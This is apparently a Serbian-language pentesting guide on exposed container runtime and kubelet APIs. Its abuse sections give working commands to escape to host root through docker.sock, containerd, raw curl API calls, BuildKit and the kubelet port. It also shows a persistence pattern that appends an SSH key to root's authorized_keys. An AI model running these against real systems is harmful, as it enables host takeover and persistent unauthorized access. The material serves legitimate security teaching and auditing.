# Izloženost Runtime API-ja i Daemona

## Pregled

Mnogi stvarni kompromisi kontejnera uopšte ne počinju bekstvom iz namespace-a. Počinju pristupom kontrolnom planu runtime-a. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman ili kubelet procesom putem montiranog Unix socket-a ili izloženog TCP listener-a, napadač može da zatraži novi kontejner sa većim privilegijama, montira filesystem hosta, pridruži se namespace-ovima hosta ili preuzme osetljive informacije o node-u. U tim slučajevima runtime API predstavlja stvarnu security granicu, a njegovo kompromitovanje je funkcionalno gotovo isto što i kompromitovanje hosta.

Zato izloženost runtime socket-a treba dokumentovati odvojeno od zaštita kernela. Kontejner sa uobičajenim seccomp-om, capabilities i MAC confinement-om i dalje može biti udaljen samo jednim API pozivom od kompromitovanja hosta ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` montiran u njemu. Kernel izolacija trenutnog kontejnera može funkcionisati upravo onako kako je predviđeno, dok management plane runtime-a ostaje potpuno izložen.

## Modeli pristupa Daemon-u

Docker Engine tradicionalno izlaže svoj privilegovani API putem lokalnog Unix socket-a na `unix:///var/run/docker.sock`. Istorijski je takođe bio izložen udaljeno putem TCP listener-a kao što su `tcp://0.0.0.0:2375` ili TLS-om zaštićenog listener-a na portu `2376`. Izlaganje daemon-a udaljeno, bez snažnog TLS-a i client authentication-a, praktično pretvara Docker API u udaljeni root interfejs.

containerd, CRI-O, Podman i kubelet izlažu slične površine visokog uticaja. Nazivi i workflow-i se razlikuju, ali logika je ista. Ako interfejs omogućava pozivaocu da kreira workload-e, montira putanje hosta, preuzima credentials ili menja pokrenute kontejnere, taj interfejs predstavlja privilegovani management kanal i tako ga treba tretirati.

Uobičajene lokalne putanje koje vredi proveriti su:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stariji ili specijalizovaniji stekovi mogu takođe izložiti endpoint-e kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. Oni su ređi u modernim okruženjima, ali kada se pronađu, treba ih tretirati sa istim oprezom, jer predstavljaju površine za kontrolu runtime-a, a ne obične aplikacione socket-e.

## Bezbedan udaljeni pristup

Ako daemon mora biti izložen izvan lokalnog socket-a, konekcija treba da bude zaštićena pomoću TLS-a, po mogućnosti uz međusobnu autentikaciju, tako da daemon proverava klijenta, a klijent proverava daemon. Stara navika otvaranja Docker daemon-a preko običnog HTTP-a radi lakšeg pristupa jedna je od najopasnijih grešaka u administraciji container-a, jer je API površina dovoljno moćna da direktno kreira privilegovane container-e.

Istorijski obrazac Docker konfiguracije izgledao je ovako:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostovima zasnovanim na systemd-u, komunikacija sa daemon-om može se pojaviti i kao `fd://`, što znači da proces nasleđuje unapred otvoren socket od systemd-a, umesto da ga sam direktno povezuje. Važna pouka nije u tačnoj sintaksi, već u bezbednosnoj posledici. Čim daemon počne da osluškuje izvan lokalnog socket-a sa strogo ograničenim dozvolama, bezbednost transporta i autentikacija klijenta postaju obavezne, a ne opciono hardening podešavanje.

## Zloupotreba

Ako je runtime socket prisutan, potvrdite koji je to socket, da li postoji kompatibilan klijent i da li je moguć raw HTTP ili gRPC pristup:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ove komande su korisne jer razlikuju nepostojeću putanju, montirani ali nedostupni socket i aktivan privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount-om ili deljenjem host namespace-a.

### Kada nijedan klijent nije instaliran

Odsustvo komande `docker`, `podman` ili drugog korisnički prilagođenog CLI-ja ne znači da je socket bezbedan. Docker Engine komunicira putem HTTP-a preko svog Unix socket-a, a Podman izlaže i Docker-compatible API i Libpod-native API kroz `podman system service`. To znači da minimalno okruženje koje sadrži samo `curl` i dalje može biti dovoljno za upravljanje daemon-om:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ovo je važno tokom post-exploitation faze jer defenders ponekad uklone uobičajene client binaries, ali ostave management socket montiran. Na Podman hostovima imajte na umu da se high-value putanja razlikuje između rootful i rootless deploymenta: `unix:///run/podman/podman.sock` za rootful service instance i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` za rootless instance.

### Kompletan primer: Docker socket do host root-a

Ako je `docker.sock` dostupan, klasičan escape je pokretanje novog containera koji montira host root filesystem, a zatim izvršavanje `chroot`-a u njemu:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Ovo omogućava direktno izvršavanje sa host-root privilegijama kroz Docker daemon. Uticaj nije ograničen samo na čitanje fajlova. Kada uđe u novi container, attacker može da menja host fajlove, prikuplja credentials, postavi persistence ili pokrene dodatne privileged workloads.

### Potpun primer: Docker Socket Do Host Namespaces

Ako attacker preferira ulazak u namespace umesto pristupa zasnovanog samo na filesystem-u:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ovaj put dolazi do hosta tako što od runtime-a zahteva kreiranje novog container-a sa eksplicitnim izlaganjem host namespace-ova, umesto iskorišćavanja postojećeg container-a.

### Docker Socket Persistence Pattern

Runtime kontrola može da se koristi i za persistence umesto jednokratnog shell-a. Generički obrazac podrazumeva kreiranje helper container-a sa host mount-om, upisivanje materijala za autorizovani pristup ili startup hook-a u montirani host filesystem, a zatim proveru da li ga host koristi.

Primer obrasca:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Ista ideja može ciljati systemd units, cron fragments, application startup files ili SSH keys, u zavisnosti od toga šta operator želi da dokaže. Važno je da se persistent change vrši kroz filesystem authority runtime daemon-a na nivou hosta, a ne kroz dodatne privilegije u originalnom container-u.

### Raw Docker API Helper Pivot

Kada Docker CLI nije dostupan, isti host-mount helper flow može se izvršiti putem HTTP-a preko Unix socket-a. Generički flow je: potvrditi API, kreirati helper container sa host bind mount-om, pokrenuti ga, kreirati exec instance i pokrenuti taj exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Konačni zahtev `/exec/<id>/start` zavisi od vraćenog exec ID-ja, ali bezbednosna tačka je nezavisna od tačnog JSON povezivanja: raw API pristup rootful Docker daemon-u dovoljan je za zahtev za pokretanje privilegovanijeg pomoćnog workload-a.

### Potpun primer: containerd Socket

Montirani `containerd` socket je obično podjednako opasan:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ako je dostupan klijent sličniji Dockeru, `nerdctl` može biti praktičniji od `ctr` jer nudi poznate opcije kao što su `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Uticaj je ponovo kompromitovanje hosta. Čak i ako Docker-specific tooling nije prisutan, drugi runtime API i dalje može pružati istu administrativnu moć. Na Kubernetes nodes, `crictl` takođe može biti dovoljan za reconnaissance i interakciju sa containerima, jer direktno komunicira sa CRI endpointom.

### BuildKit Socket

`buildkitd` je lako prevideti zato što ga ljudi često smatraju „samo build backendom“, ali je daemon i dalje privilegovan control plane. Dostupan `buildkitd.sock` može napadaču omogućiti da izvršava proizvoljne build korake, proverava mogućnosti workera, koristi lokalne contexte iz kompromitovanog okruženja i zahteva opasne entitlements kao što su `network.host` ili `security.insecure`, kada je daemon konfigurisan da ih dozvoli.

Korisne početne interakcije su:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ako daemon prihvata build zahteve, proverite da li su dostupni insecure entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Tačan uticaj zavisi od konfiguracije daemon-a, ali rootful BuildKit servis sa permisivnim entitlements nije bezazlena pogodnost za developere. Tretirajte ga kao još jednu administrativnu površinu visoke vrednosti, naročito na CI runnerima i deljenim build čvorovima.

### Kubelet API preko TCP-a

kubelet nije container runtime, ali je i dalje deo ravni za upravljanje čvorom i često se razmatra u okviru iste granice poverenja. Ako je kubelet secure port `10250` dostupan iz workload-a ili su node credentials, kubeconfig fajlovi ili proxy prava izloženi, attacker može da izlista Pods, preuzme logove ili izvršava komande u containerima na samom čvoru, a da pritom uopšte ne dodirne admission path Kubernetes API servera.

Počnite jeftinom enumeracijom:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ako kubelet ili API-server proxy putanja autorizuje `exec`, klijent koji podržava WebSocket može to pretvoriti u izvršavanje koda u drugim kontejnerima na node-u. To je takođe razlog zašto je `nodes/proxy` sa samo `get` dozvolom opasniji nego što zvuči: zahtev i dalje može da dođe do kubelet endpointa koji izvršavaju komande, a te direktne kubelet interakcije se ne pojavljuju u uobičajenim Kubernetes audit logovima.<sup>[[2]](#references)</sup>

## Provere

Cilj ovih provera je da utvrde da li kontejner može da dosegne bilo koji management plane koji je trebalo da ostane izvan granice poverenja.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Šta je ovde zanimljivo:

- Montirani runtime socket je obično direktan administrativni primitive, a ne samo otkrivanje informacija.
- TCP listener na `2375` bez TLS-a treba tretirati kao uslov za remote compromise.
- Environment variables kao što je `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran za komunikaciju sa host runtime-om.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Lokalni Unix socket po defaultu | `dockerd` osluškuje na lokalnom socket-u, a daemon je obično rootful | montiranje `/var/run/docker.sock`, izlaganje `tcp://...:2375`, slab ili nedostajući TLS na `2376` |
| Podman | CLI bez daemon-a po defaultu | Za uobičajenu lokalnu upotrebu nije potreban dugotrajni privilegovani daemon; API socket-i i dalje mogu biti izloženi kada je omogućen `podman system service` | izlaganje `podman.sock`, široko pokretanje service-a, rootful API upotreba |
| containerd | Lokalni privilegovani socket | Administrativni API je izložen preko lokalnog socket-a i obično ga koriste alati višeg nivoa | montiranje `containerd.sock`, širok `ctr` ili `nerdctl` pristup, izlaganje privilegovanih namespace-ova |
| CRI-O | Lokalni privilegovani socket | CRI endpoint je namenjen trusted komponentama na samom node-u | montiranje `crio.sock`, izlaganje CRI endpoint-a neproverenim workload-ovima |
| Kubernetes kubelet | Node-local management API | Kubelet ne bi trebalo da bude široko dostupan iz Pod-ova; pristup može izložiti stanje Pod-ova, credentials i execution funkcije, u zavisnosti od authn/authz | montiranje kubelet socket-a ili cert-ova, slaba kubelet autentikacija, host networking uz dostupan kubelet endpoint |

## References

- [1] [eksploatacija containerd socket-a, prvi deo](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Rizici zaobilaženja Kubernetes API Server-a](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
